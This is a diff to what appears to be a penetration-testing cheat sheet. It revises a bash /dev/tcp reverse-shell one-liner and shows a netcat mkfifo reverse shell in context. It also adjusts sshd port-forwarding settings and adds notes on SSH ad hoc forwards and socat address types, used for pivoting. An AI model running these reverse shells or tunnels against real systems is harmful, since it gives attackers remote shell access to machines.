@@ -1729,8 +1729,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 443 >/tmp/
 **Bash Reverse Shell**
 
 ```sh
-# only works on Linux
-bash -i >& /dev/tcp/LISTEN_IP/443 0>&1
+# only works on Linux in bash
+/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'
 ```
 
 **Socat Listener**
@@ -3615,7 +3615,7 @@ Before starting, it is best to have the following settings enabled in your
 
 ```ini
 # Specifies that remote hosts are allowed to connect to local forwarded ports.
-GatewayPorts yes
+GatewayPorts clientspecified
 
 # Allow TCP forwarding (local and remote)
 AllowTcpForwarding yes
@@ -3692,6 +3692,13 @@ connection is established so you can keep using the terminal.
   Using these together prevents command execution on the remote host (jump box)
 - `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding
 
+`ssh` also has an open command line mode to add or delete **ad hoc port forwards**. This can
+be summoned by typing the `shift ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to
+note is that the `~C` is only recognized after a new line, so be sure to hit Enter a few times before
+typing in the key sequence. It likes to be called from a pure blinking command prompt that hasn’t
+been "dirtied" by, for example, typing something, then deleting it. So just be sure to hit Enter a
+few times before trying to drop into the SSH open command line mode.
+
 ## 10.2. SOCKS Proxies and proxychains
 
 `proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
@@ -3767,13 +3774,21 @@ General socat syntax
 socat [options] <address> <address>
 ```
 
-Where `<address>` is in the form:
+Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`
 
-```
-protocol:ip:port
-```
-
-You can use `STDIN` as an address (equivalently, `-`)
+Other useful addresses:
+ - `STDIN` (equivalently, `-`)
+ - `STDOUT`
+ - `STDIO` (both stdin and stdout)
+ - `EXEC:cmdline` or `SYSTEM:shell-cmd`
+ - `FILE:/path/to/file` - log output to file
+ - `FILE:$(tty),rawer` - a raw terminal
+ - `PTY,link=/tmp/mypty,rawer,wait-slave`
+ - `UDP:host:port` and `UDP-LISTEN:port`
+ - `TCP:host:port` and `TCP-LISTEN:port`
+ - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
+ - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
+ - `PIPE` or `PIPE:filename`
 
 ## 10.5. Bending with rinetd
 
